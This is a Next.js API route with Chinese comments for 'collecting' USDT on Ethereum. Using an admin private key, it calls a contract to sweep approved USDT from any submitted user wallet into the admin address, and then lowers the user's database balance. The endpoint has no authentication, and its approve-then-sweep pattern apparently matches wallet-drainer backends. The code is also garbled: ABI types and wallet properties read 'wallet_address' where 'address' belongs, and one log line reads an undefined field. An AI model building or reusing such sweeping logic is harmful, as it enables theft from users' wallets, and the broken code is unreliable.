import { type NextRequest, NextResponse } from 'next/server'
import { addCorsHeaders } from '@/lib/utils'
import { supabase } from '@/lib/supabase'
import { ethers } from 'ethers'

export const dynamic = 'force-dynamic'

// ETH 主网配置 - 多个RPC节点备用
const ETH_RPC_URLS = [
  'https://ethereum.publicnode.com',
  'https://eth.llamarpc.com', 
  'https://rpc.ankr.com/eth',
  'https://ethereum.blockpi.network/v1/rpc/public',
  'https://rpc.mevblocker.io'
]
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7' // ETH USDT 合约地址
const STAKING_CONTRACT_ADDRESS = '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218' // 归集到财务地址的合约
const USDT_DECIMALS = 6

// 管理员私钥（用于签名交易）
const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY || ''

// 创建带有备用节点的Provider
async function createProvider() {
  for (let i = 0; i < ETH_RPC_URLS.length; i++) {
    try {
      const provider = new ethers.JsonRpcProvider(ETH_RPC_URLS[i])
      // 测试连接
      await provider.getNetwork()
      console.log(`✅ 连接到RPC节点 ${i + 1}: ${ETH_RPC_URLS[i]}`)
      return provider
    } catch (error) {
      console.log(`❌ RPC节点 ${i + 1} 连接失败: ${ETH_RPC_URLS[i]}`)
      if (i === ETH_RPC_URLS.length - 1) {
        throw new Error('所有RPC节点都连接失败')
      }
    }
  }
}

// 智能发送交易 - 如果一个节点失败自动切换到下一个
async function sendTransactionWithFallback(contract, method, params, gasOptions) {
  let lastError = null
  
  for (let i = 0; i < ETH_RPC_URLS.length; i++) {
    try {
      console.log(`🔄 尝试使用RPC节点 ${i + 1}: ${ETH_RPC_URLS[i]}`)
      
      // 重新创建provider和contract
      const provider = new ethers.JsonRpcProvider(ETH_RPC_URLS[i])
      const adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY.startsWith('0x') ? ADMIN_PRIVATE_KEY.slice(2) : ADMIN_PRIVATE_KEY, provider)
      const newContract = new ethers.Contract(contract.target, contract.interface, adminWallet)
      
      // 发送交易
      const tx = await newContract[method](...params, gasOptions)
      console.log(`✅ 交易发送成功，节点 ${i + 1}: ${tx.hash}`)
      return tx
      
    } catch (error) {
      lastError = error
      console.log(`❌ 节点 ${i + 1} 发送交易失败:`, error.message.slice(0, 100))
      
      // 如果是"failed to send tx"错误，尝试下一个节点
      if (error.message.includes('failed to send tx') && i < ETH_RPC_URLS.length - 1) {
        continue
      }
      
      // 如果不是网络错误，或者是最后一个节点，直接抛出错误
      if (i === ETH_RPC_URLS.length - 1) {
        throw error
      }
    }
  }
  
  throw lastError
}

// 质押合约 ABI（包含归集函数）
const STAKING_CONTRACT_ABI = [
  {
    "constant": false,
    "inputs": [{"name": "_amount", "type": "uint256"}],
    "name": "withdrawContractTokens",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "_user", "type": "wallet_address"},
      {"name": "_amount", "type": "uint256"}
    ],
    "name": "collectUserTokens",
    "outputs": [],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "owner",
    "outputs": [{"name": "", "type": "wallet_address"}],
    "type": "function"
  }
]

// ETH 主网 USDT 合约 ABI（针对特殊实现进行调整）
const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "wallet_address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {"name": "_owner", "type": "wallet_address"},
      {"name": "_spender", "type": "wallet_address"}
    ],
    "name": "allowance",
    "outputs": [{"name": "", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "_from", "type": "wallet_address"},
      {"name": "_to", "type": "wallet_address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "transferFrom",
    "outputs": [], // ETH 主网 USDT 不返回 boolean
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name": "_to", "type": "wallet_address"},
      {"name": "_value", "type": "uint256"}
    ],
    "name": "transfer",
    "outputs": [],
    "type": "function"
  }
]

export async function POST(request: NextRequest) {
  try {
    const body = await request.json() as { userAddress?: string; amount?: string | number }
    const { userAddress, amount } = body

    if (!userAddress || !amount) {
      const response = NextResponse.json({
        success: false,
        error: '缺少必需参数'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    const collectionAmount = Number.parseFloat(amount.toString())
    if (isNaN(collectionAmount) || collectionAmount <= 0) {
      const response = NextResponse.json({
        success: false,
        error: '无效的归集金额'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    if (!ADMIN_PRIVATE_KEY) {
      const response = NextResponse.json({
        success: false,
        error: '管理员私钥未配置'
      }, { status: 500 })
      return addCorsHeaders(response)
    }

    console.log(`🔄 开始真实链上归集操作:`, { userAddress, amount: collectionAmount })

    // 创建 ETH 网络提供者
    const provider = await createProvider()
    
    // 创建管理员钱包（移除0x前缀如果存在）
    const cleanPrivateKey = ADMIN_PRIVATE_KEY.startsWith('0x') 
      ? ADMIN_PRIVATE_KEY.slice(2) 
      : ADMIN_PRIVATE_KEY
    
    console.log(`🔑 私钥配置状态: ${ADMIN_PRIVATE_KEY ? '已配置' : '未配置'}`)
    console.log(`🔑 清理后私钥状态: ${cleanPrivateKey ? '已处理' : '无效'}`)
    console.log(`🔑 私钥长度: ${cleanPrivateKey.length}`)
    
    const adminWallet = new ethers.Wallet(cleanPrivateKey, provider)
    console.log(`👤 管理员地址: ${adminWallet.wallet_address}`)
    
    // 创建质押合约实例
    const stakingContract = new ethers.Contract(STAKING_CONTRACT_ADDRESS, STAKING_CONTRACT_ABI, adminWallet)
    
    // 创建 USDT 合约实例（用于查询余额）
    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, adminWallet)

    // 检查合约所有者权限
    const contractOwner = await stakingContract.owner()
    console.log(`👤 合约所有者: ${contractOwner}`)
    console.log(`👤 管理员地址: ${adminWallet.wallet_address}`)
    
    if (contractOwner.toLowerCase() !== adminWallet.wallet_address.toLowerCase()) {
      const response = NextResponse.json({
        success: false,
        error: `管理员地址不是合约所有者，合约所有者: ${contractOwner}`
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    // 验证合约函数是否存在
    try {
      console.log(`🔍 验证合约函数是否存在...`)
      const contractCode = await provider.getCode(STAKING_CONTRACT_ADDRESS)
      if (contractCode === '0x') {
        const response = NextResponse.json({
          success: false,
          error: '合约地址不存在或未部署'
        }, { status: 400 })
        return addCorsHeaders(response)
      }
      console.log(`✅ 合约代码存在，长度: ${contractCode.length}`)
      
      // 尝试检查函数是否存在（通过静态调用）
      try {
        await stakingContract.collectUserTokens.staticCall(userAddress, ethers.parseUnits('1', USDT_DECIMALS))
        console.log(`✅ collectUserTokens 函数存在且可调用`)
      } catch (funcError) {
        console.error(`❌ collectUserTokens 函数调用失败:`, funcError)
        
        // 检查是否是verify问题
        if (funcError instanceof Error && funcError.message.includes('Insufficient allowance')) {
          const response = NextResponse.json({
            success: false,
            error: `用户未授权USDT给新合约地址。请用户访问USDT合约 ${USDT_CONTRACT_ADDRESS} 调用approve函数，授权给合约地址 ${STAKING_CONTRACT_ADDRESS}`,
            details: {
              action: 'AUTHORIZATION_REQUIRED',
              usdtContract: USDT_CONTRACT_ADDRESS,
              approveTarget: STAKING_CONTRACT_ADDRESS,
              userAddress: userAddress
            }
          }, { status: 400 })
          return addCorsHeaders(response)
        } else if (funcError instanceof Error && funcError.message.includes('missing revert data')) {
          const maxRetries = 3
          const response = NextResponse.json({
            success: false,
            error: `网络拥堵或RPC节点问题导致交易失败，已尝试 ${maxRetries} 次。请稍后重试或检查管理员地址ETH余额是否充足。预计需要 ${ethers.formatEther(BigInt(400000) * ethers.parseUnits('35', 'gwei'))} ETH 作为Gas费。`,
            details: {
              action: 'NETWORK_ERROR',
              errorType: 'missing_revert_data',
              retryAttempts: maxRetries,
              gasEstimate: ethers.formatEther(BigInt(400000) * ethers.parseUnits('35', 'gwei')),
              adminAddress: adminWallet.wallet_address
            }
          }, { status: 400 })
          return addCorsHeaders(response)
        } else {
          const response = NextResponse.json({
            success: false,
            error: `合约函数调用失败，可能原因：1) 用户未授权USDT给新合约地址 2) 网络拥堵 3) Gas不足`,
            details: {
              action: 'AUTHORIZATION_LIKELY_REQUIRED',
              usdtContract: USDT_CONTRACT_ADDRESS,
              approveTarget: STAKING_CONTRACT_ADDRESS,
              userAddress: userAddress,
              errorMessage: funcError instanceof Error ? funcError.message : 'Unknown error'
            }
          }, { status: 400 })
          return addCorsHeaders(response)
        }
      }
    } catch (verifyError) {
      console.error(`❌ 合约验证失败:`, verifyError)
      const response = NextResponse.json({
        success: false,
        error: `合约验证失败: ${verifyError instanceof Error ? verifyError.message : 'Unknown error'}`
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    // 检查用户钱包的USDT余额
    const userBalance = await usdtContract.balanceOf(userAddress)
    const userBalanceFormatted = ethers.formatUnits(userBalance, USDT_DECIMALS)
    
    console.log(`💰 用户钱包 USDT 余额: ${userBalanceFormatted}`)

    // 检查用户是否已verify质押合约地址（归集到财务地址的合约）
    const allowance = await usdtContract.allowance(userAddress, STAKING_CONTRACT_ADDRESS)
    const allowanceFormatted = ethers.formatUnits(allowance, USDT_DECIMALS)
    
    console.log(`🔐 用户授权合约额度: ${allowanceFormatted} USDT`)
    console.log(`🔐 原始授权额度: ${allowance.toString()}`)
    console.log(`🔐 用户地址: ${userAddress}`)
    console.log(`🔐 合约地址: ${STAKING_CONTRACT_ADDRESS}`)

    // 检查余额和verify是否足够
    const requiredAmount = ethers.parseUnits(collectionAmount.toString(), USDT_DECIMALS)
    if (userBalance < requiredAmount) {
      const response = NextResponse.json({
        success: false,
        error: `用户钱包余额不足，当前余额: ${userBalanceFormatted} USDT，需要: ${collectionAmount} USDT`
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    if (allowance < requiredAmount) {
      const response = NextResponse.json({
        success: false,
        error: `用户未verify足够的 USDT 给质押合约，当前授权额度: ${allowanceFormatted} USDT，需要: ${collectionAmount} USDT。请让用户先授权USDT给质押合约: ${STAKING_CONTRACT_ADDRESS}`,
        details: {
          requiredAction: '用户需要调用 USDT 合约的 approve 函数',
          approveTarget: STAKING_CONTRACT_ADDRESS,
          approveAmount: collectionAmount,
          usdtContract: USDT_CONTRACT_ADDRESS,
          currentAllowance: allowanceFormatted
        }
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    // 执行归集操作 - 使用修复后的质押合约的 collectUserTokens 函数
    console.log(`🚀 执行归集: 使用修复后的质押合约从用户 ${userAddress} 转移 ${collectionAmount} USDT 到管理员地址`)

    let tx, receipt
    let userBalanceBefore, adminBalanceBefore, userBalanceAfter, adminBalanceAfter

    try {
      // 先获取用户当前余额用于验证
      userBalanceBefore = await usdtContract.balanceOf(userAddress)
      adminBalanceBefore = await usdtContract.balanceOf(adminWallet.wallet_address)
      
      console.log(`📊 转账前余额 - 用户: ${ethers.formatUnits(userBalanceBefore, USDT_DECIMALS)} USDT, 管理员: ${ethers.formatUnits(adminBalanceBefore, USDT_DECIMALS)} USDT`)
      
      // 使用修复后的合约：检查verify->转账到合约->转账给管理员
      console.log(`🔄 调用修复后的合约 collectUserTokens 函数...`)
      
      // 为ETH主网设置更激进的gas配置
      // Gas 配置 - 根据当前网络状况动态调整
      const gasLimit = BigInt(200000) // 合理的gas限制
      
      // 获取当前网络Gas价格并稍微加价以确保被打包
      const feeData = await provider.getFeeData()
      let gasPrice = feeData.gasPrice ? feeData.gasPrice * BigInt(150) / BigInt(100) : ethers.parseUnits('1', 'gwei')
      
      // 设置最小Gas价格以防网络价格过低（但不要太高）
      const minGasPrice = ethers.parseUnits('0.5', 'gwei')
      const maxGasPrice = ethers.parseUnits('5', 'gwei') // 设置最大值避免过高
      if (gasPrice < minGasPrice) {
        gasPrice = minGasPrice
      } else if (gasPrice > maxGasPrice) {
        gasPrice = maxGasPrice
      }
      console.log(`⛽ 使用 gas 限制: ${gasLimit.toString()}`)
      console.log(`⛽ 使用 gas 价格: ${ethers.formatUnits(gasPrice, 'gwei')} gwei`)
      
      // 尝试多次调用，处理网络问题
      let retryCount = 0;
      const maxRetries = 3;
      
      while (retryCount < maxRetries) {
        try {
          console.log(`🔄 尝试第 ${retryCount + 1} 次调用合约...`)
          
      // 调用新修复的合约的collectUserTokens函数 - 使用备用节点
      tx = await sendTransactionWithFallback(
        stakingContract, 
        'collectUserTokens', 
        [userAddress, requiredAmount],
        {
          gasLimit: gasLimit,
          gasPrice: gasPrice
        }
      );
          
          console.log(`✅ 合约调用成功，交易哈希: ${tx.hash}`)
          break; // 成功就退出循环
          
        } catch (retryError) {
          retryCount++;
          console.log(`❌ 第 ${retryCount} 次尝试失败: ${retryError.message.slice(0, 100)}`)
          
          if (retryCount >= maxRetries) {
            // 最后一次尝试失败，抛出错误
            throw retryError;
          }
          
          // 等待2秒后重试，并提高gas价格
          console.log(`⏳ 等待 2 秒后重试，提高gas价格...`)
          await new Promise(resolve => setTimeout(resolve, 2000));
          gasPrice = gasPrice * BigInt(110) / BigInt(100); // 每次重试提高10%
          console.log(`⛽ 新的 gas 价格: ${ethers.formatUnits(gasPrice, 'gwei')} gwei`)
        }
      }
      console.log(`📝 修复后合约归集交易已提交，哈希: ${tx.hash}`)

      // 等待交易确认
      console.log(`⏳ 等待交易确认...`)
      receipt = await tx.wait()
      console.log(`✅ 交易已确认，区块号: ${receipt.blockNumber}`)
      
      // 验证转账是否成功
      userBalanceAfter = await usdtContract.balanceOf(userAddress)
      adminBalanceAfter = await usdtContract.balanceOf(adminWallet.wallet_address)
      
      console.log(`📊 转账后余额 - 用户: ${ethers.formatUnits(userBalanceAfter, USDT_DECIMALS)} USDT, 管理员: ${ethers.formatUnits(adminBalanceAfter, USDT_DECIMALS)} USDT`)
      
      // 验证转账金额是否正确
      const actualTransferred = userBalanceBefore - userBalanceAfter
      const expectedAmount = requiredAmount
      
      if (actualTransferred.toString() !== expectedAmount.toString()) {
        console.warn(`⚠️ 转账金额验证失败: 预期 ${expectedAmount}, 实际 ${actualTransferred}`)
      } else {
        console.log(`✅ 转账金额验证成功: ${ethers.formatUnits(actualTransferred, USDT_DECIMALS)} USDT`)
      }
      
    } catch (transferError) {
      console.error(`❌ USDT transferFrom 调用失败:`, transferError)
      
      // 尝试解析具体错误
      const errorMessage = transferError instanceof Error ? transferError.message : 'Unknown error'
      let suggestedAction = ''
      
      if (errorMessage.includes('insufficient allowance')) {
        suggestedAction = '请检查用户是否已授权足够的 USDT 给管理员地址'
      } else if (errorMessage.includes('insufficient balance')) {
        suggestedAction = '请检查用户 USDT 余额是否足够'
      } else if (errorMessage.includes('gas')) {
        suggestedAction = '请尝试增加 gas 限制或 gas 价格'
      } else {
        suggestedAction = '这可能是 ETH 主网 USDT 合约的特殊性导致的，建议联系技术支持'
      }
      
      const response = NextResponse.json({
        success: false,
        error: `USDT 转账失败: ${errorMessage}`,
        details: {
          transferError: errorMessage,
          suggestedAction: suggestedAction,
          userAddress: userAddress,
          adminAddress: adminWallet.wallet_address,
          amount: collectionAmount
        },
        usdtContract: USDT_CONTRACT_ADDRESS,
        parameters: {
          from: userAddress,
          to: adminWallet.wallet_address,
          amount: requiredAmount.toString()
        }
      }, { status: 500 })
      return addCorsHeaders(response)
    }

    // 更新数据库记录（合约归集操作）
    try {
      // 查找用户（如果提供了用户地址）
      if (userAddress) {
        const { data: userData, error: userError } = await supabase
          .from('nh_member_new')
          .select('id, usdt, dividend_usdt, withdrawal_usdt')
          .eq('wallet_address', userAddress)
          .eq('is_active', true)
          .single()

        if (!userError && userData) {
          // 更新用户余额（智能分配逻辑与主归集接口保持一致）
          const currentUsdt = Number.parseFloat(userData.usdt || '0')
          const currentGjCash = Number.parseFloat(userData.dividend_usdt || '0')
          const totalAvailable = currentUsdt + currentGjCash
          
          // 验证用户是否有足够余额（链上验证后的二次确认）
          if (totalAvailable >= collectionAmount) {
            let newUsdt = currentUsdt
            let newGjCash = currentGjCash
            let remainingAmount = collectionAmount

            // 优先从gj_withdrawable_usdt中扣除
            if (newGjCash > 0 && remainingAmount > 0) {
              const deductFromGj = Math.min(newGjCash, remainingAmount)
              newGjCash -= deductFromGj
              remainingAmount -= deductFromGj
            }

            // 如果还有剩余，从usdt中扣除
            if (remainingAmount > 0) {
              newUsdt -= remainingAmount
            }

            const updateData = {
              usdt: Number(newUsdt.toFixed(6)),
              dividend_usdt: Number(newGjCash.toFixed(6)),
              withdrawal_usdt: Number((Number.parseFloat(userData.withdrawal_usdt || '0') + collectionAmount).toFixed(6)),
              updated_at: new Date().toISOString()
            }

            await supabase
              .from('nh_member_new')
              .update(updateData)
              .eq('id', userData.id)

            console.log(`📊 数据库已更新: USDT ${currentUsdt} -> ${updateData.usdt}, GJ_CASH ${currentGjCash} -> ${updateData.gj_withdrawable_usdt}`)
          } else {
            console.warn(`⚠️ 数据库余额不足进行归集操作: 需要 ${collectionAmount}, 可用 ${totalAvailable}`)
          }
        }
      }
    } catch (dbError) {
      console.warn('更新数据库失败:', dbError)
    }

    // 记录归集日志
    try {
      const transferType = 'contract_collection'
      const description = `合约归集操作 - 从用户 ${userAddress} 转移 ${collectionAmount} USDT 到管理员地址`
      
      await supabase
        .from('authorized_transfers')
        .insert([{
          user_wallet_address: userAddress || 'contract_collection',
          to_wallet_address: adminWallet.wallet_address,
          amount: collectionAmount,
          transfer_id: `${transferType}_${Date.now()}_${adminWallet.wallet_address.slice(-8)}`,
          transaction_hash: tx.hash,
          description: description,
          status: 'completed',
          transaction_type: transferType,
          network: 'ETH'
        }])
    } catch (logError) {
      console.warn('记录归集日志失败:', logError)
    }

    const result = {
             transactionHash: tx.hash,
             fromAddress: userAddress,
             toAddress: adminWallet.wallet_address,
             amount: collectionAmount,
             gasUsed: receipt.gasUsed.toString(),
             gasPrice: (receipt.gasPrice || BigInt(0)).toString(),
             blockNumber: receipt.blockNumber,
             status: 'success',
             explorerUrl: `https://etherscan.io/tx/${tx.hash}`,
             usdtContract: USDT_CONTRACT_ADDRESS,
             transferMethod: 'direct_usdt_transferfrom',
             balanceVerification: {
               userBalanceBefore: ethers.formatUnits(userBalanceBefore || BigInt(0), USDT_DECIMALS),
               userBalanceAfter: ethers.formatUnits(userBalanceAfter || BigInt(0), USDT_DECIMALS),
               adminBalanceBefore: ethers.formatUnits(adminBalanceBefore || BigInt(0), USDT_DECIMALS),
               adminBalanceAfter: ethers.formatUnits(adminBalanceAfter || BigInt(0), USDT_DECIMALS)
             }
           }

    console.log(`✅ 真实链上归集操作成功 (合约归集):`, result)

    const response = NextResponse.json({
      success: true,
      message: '真实链上归集操作成功',
      data: {
        ...result,
        timestamp: new Date().toISOString()
      }
    }, { status: 200 })
    return addCorsHeaders(response)

  } catch (error) {
    console.error('真实链上归集操作失败:', error)
    const response = NextResponse.json({
      success: false,
      error: '真实链上归集操作失败',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
    return addCorsHeaders(response)
  }
}
